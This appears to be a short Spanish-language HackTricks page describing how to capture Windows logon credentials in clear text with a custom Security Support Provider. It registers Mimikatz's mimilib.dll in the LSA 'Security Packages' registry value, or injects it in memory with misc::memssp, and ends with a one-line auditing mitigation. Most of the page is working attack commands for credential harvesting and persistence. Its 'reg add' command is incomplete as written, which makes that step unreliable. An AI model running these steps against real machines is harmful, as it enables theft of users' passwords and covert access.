# Custom SSP

{{#include ../../banners/hacktricks-training.md}}

### Custom SSP

[Aprende qué es un SSP (Proveedor de Soporte de Seguridad) aquí.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puedes crear tu **propio SSP** para **capturar** en **texto claro** las **credenciales** utilizadas para acceder a la máquina.

#### Mimilib

Puedes usar el binario `mimilib.dll` proporcionado por Mimikatz. **Esto registrará en un archivo todas las credenciales en texto claro.**\
Coloca el dll en `C:\Windows\System32\`\
Obtén una lista de los Paquetes de Seguridad LSA existentes:
```bash:attacker@target
PS C:\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY_LOCAL_MACHINE\system\currentcontrolset\control\lsa
Security Packages    REG_MULTI_SZ    kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u
```
Agrega `mimilib.dll` a la lista de Proveedores de Soporte de Seguridad (Paquetes de Seguridad):
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
```
Y después de un reinicio, todas las credenciales se pueden encontrar en texto claro en `C:\Windows\System32\kiwissp.log`

#### En memoria

También puedes inyectar esto en memoria directamente usando Mimikatz (ten en cuenta que podría ser un poco inestable/no funcionar):
```powershell
privilege::debug
misc::memssp
```
Esto no sobrevivirá a los reinicios.

#### Mitigación

Event ID 4657 - Auditoría de creación/cambio de `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`

{{#include ../../banners/hacktricks-training.md}}
